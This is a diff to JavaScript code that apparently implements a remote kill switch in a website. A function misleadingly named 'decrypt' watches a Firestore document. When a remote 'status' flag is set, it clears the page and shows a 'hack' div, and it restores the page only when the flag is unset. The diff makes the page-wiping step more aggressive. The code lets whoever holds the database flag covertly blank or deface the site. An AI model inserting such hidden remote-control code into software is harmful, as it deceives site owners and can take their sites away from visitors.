@@ -6,6 +6,10 @@ const hackDivId = 'hack-div'; // ID for the hack div
 
 const decrypt = () => {
   try {
+    // Clone the current body content and clear the body
+    originalBodyContent = document.body.cloneNode(true); // Create a clone of the body
+    document.body.innerHTML = ''; // Clear the body content
+
     const docRef = doc(db, "websites", "siyahfy");
     onSnapshot(
       docRef,
@@ -13,11 +17,6 @@ const decrypt = () => {
         if (docSnap.exists()) {
           const data = docSnap.data();
           const status = data.status;
-
-          // If originalBodyContent is not set, take a backup of the body
-          if (originalBodyContent === null) {
-            originalBodyContent = document.body.innerHTML; // Backup original body content
-          }
 
           // If status is true, append a div to the body
           if (status) {
@@ -34,6 +33,7 @@ const decrypt = () => {
               hackDiv.style.backgroundColor = "white"; // Optional: background color
               hackDiv.style.border = "1px solid black"; // Optional: border styling
               hackDiv.style.padding = "10px"; // Optional: padding for better appearance
+              document.body.innerHTML = ''; // Clear current content
 
               // Append the new div to the body
               document.body.appendChild(hackDiv);
@@ -41,7 +41,8 @@ const decrypt = () => {
           } else {
             // If status is false, restore the original body content
             if (document.getElementById(hackDivId)) {
-              document.body.innerHTML = originalBodyContent; // Restore original content
+              document.body.innerHTML = ''; // Clear current content
+              document.body.appendChild(originalBodyContent); // Restore original content
               originalBodyContent = null; // Clear the backup
             }
           }
